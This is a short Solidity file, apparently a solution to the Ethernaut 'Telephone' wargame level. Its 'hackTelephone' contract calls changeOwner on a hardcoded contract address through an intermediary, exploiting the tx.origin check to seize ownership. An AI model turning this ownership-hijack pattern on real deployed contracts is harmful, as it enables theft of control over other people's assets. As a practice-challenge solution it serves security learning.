// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone{
    function changeOwner(address _owner) public {}
}

contract hackTelephone{
    Telephone public originalContract = Telephone(0x0b44A0B83D1933c8a86EeF11899c3B84bE663c2c);
    function hackphone (address newowner) public {
        originalContract.changeOwner(newowner);
    }
}